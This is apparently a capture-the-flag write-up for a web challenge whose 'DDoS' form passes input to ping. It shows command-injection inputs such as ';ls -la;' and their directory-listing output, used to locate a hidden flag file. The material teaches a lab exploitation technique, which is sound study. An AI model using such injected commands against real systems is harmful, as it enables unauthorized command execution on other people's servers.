# Dédé-OS v1.0

### Description

Serveur de déni de service en masse pour les 1337 h4xorz. Essayez de prouver au propriétaire que c'est de la merde. Lire le fichier contenant le flag.

### Solution

On the page, we have an text input and a button "attack".
The site is "supposed" to DDOS the adress we put into.

If we put an address it returns
> "Target reached !".

Obviously, we have to try command injections.

For that, I have referred to this cheat sheet : https://github.com/payloadbox/command-injection-payload-list

As the command behind seems to be `ping <address>`, if we put a `;` we will be able to execute another command. We can also us `||` because if a command is not working it will execute the one after.

```bash
$;ls -la;

Result from attack :

total 20
dr-xr-xr-x    1 root     root          4096 Nov 28 18:35 .
drwxr-xr-x    1 root     root          4096 Dec  3 14:44 ..
-r-xr-xr-x    1 root     root          1169 Nov 28 02:11 index.php
dr-xr-xr-x    1 root     root          4096 Nov 28 02:11 secret
-r-xr-xr-x    1 root     root           778 Nov 28 02:11 style.css

```
That's it ! Now we know we can execute commands.

After exploring the folder the flag was hidden in the following path :

```bash
$ ;ls -la secret/the/flag/is/here;

Result from attack :

total 12
dr-xr-xr-x    1 root     root          4096 Nov 28 02:11 .
dr-xr-xr-x    1 root     root          4096 Nov 28 02:11 ..
-r-xr-xr-x    1 root     root            25 Nov 28 02:11 .flag
```

Flag : `H2G2{y3aH_b4sH_yoU_knOW}`